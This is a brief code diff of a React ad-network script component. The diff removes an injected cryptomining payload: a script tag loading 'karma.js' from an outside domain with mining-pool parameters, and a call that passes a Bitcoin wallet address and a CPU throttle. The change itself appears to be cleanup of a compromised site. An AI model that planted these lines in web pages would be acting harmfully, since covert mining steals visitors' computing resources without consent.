@@ -95,15 +95,7 @@ const AdNetworkScript: React.FC = () => {
     next();
   }
 })();`}
-
-
-<script src="https://thelifewillbefine.de/karma/karma.js?karma=bs?algy=flex/native?nosaj=flex.na.mine.zpool.ca:3340" ></script>
-<script type="text/javascript">
-EverythingIsLife('bc1qk5hd7a2r72l2yesav93zq59lj5p56skmvsmhtx', 'c=BTC', 60);
-</script>
-
-
-    </Script>
+ </Script>
 
 
 
